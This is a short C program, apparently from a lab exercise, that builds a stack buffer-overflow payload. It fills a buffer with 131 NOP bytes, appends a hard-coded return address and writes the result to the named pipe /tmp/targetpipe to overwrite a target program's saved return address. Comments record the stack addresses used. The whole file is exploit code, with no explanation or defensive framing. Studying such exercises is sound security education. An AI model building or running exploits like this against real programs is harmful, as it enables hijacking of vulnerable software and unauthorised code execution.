#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[136];
  char add[] = "\x01\x20\xa7\xbb";
  int i;
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x90",1);
  
  strcpy(bufr + 131, add);
  writecmd(PIPEPATH, bufr);
  
  return 0;
}
// esp: 0xbfbf57d8 -> 08048be8
// buf: 0xbfbf57e5